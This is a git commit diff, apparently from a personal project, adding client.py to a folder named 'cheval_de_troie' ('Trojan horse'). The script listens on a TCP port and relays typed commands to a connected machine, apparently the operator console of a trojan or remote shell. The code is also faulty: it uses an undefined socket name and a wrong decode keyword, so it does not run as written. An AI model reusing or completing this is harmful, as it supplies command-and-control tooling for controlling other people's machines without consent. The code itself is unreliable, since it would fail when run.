65045c5f3fcba205a6a901d218f07dac5ca66652
Angel <angel.velasco0x7@gmail.com>
2026-02-08 19:36:55 +0100

    Update client.py

--- cheval_de_troie/client.py
+++ cheval_de_troie/client.py
@@ -1,1 +1,24 @@
+import socket
+
+import sys
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+port = 50000
+
+client_socket.bind(('', port))
+client_socket.listen(5)
+print(f"[*] Listening on port {port}...")
+
+while True:
+    (client, addr) = client_socket.accept()
+    print(f"[*] Connection from {addr[0]}:{addr[1]}")
+    while True:
+        r = str(sys.stdin.readline())
+        serveursocket.send(r.encode())
+        r = serveursocket.recv(1024)
+        client_answer = str(r.decode("utf-8", error = "ignore"))
+        print(str(client_answer) + "\n")
+        
+        
+        
 
